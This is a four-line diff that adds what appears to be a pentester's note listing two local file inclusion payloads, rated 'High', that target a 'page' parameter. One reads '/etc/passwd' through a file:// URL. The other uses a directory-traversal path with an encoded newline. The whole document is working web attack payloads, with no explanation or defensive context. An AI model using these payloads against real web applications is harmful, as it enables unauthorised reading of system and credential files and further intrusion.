@@ -1,0 +1,4 @@
+High == 
+       LFI==
+              1= page=file:///etc/passwd
+              2= page=file.php%0A/../../../../../../../etc/passwd
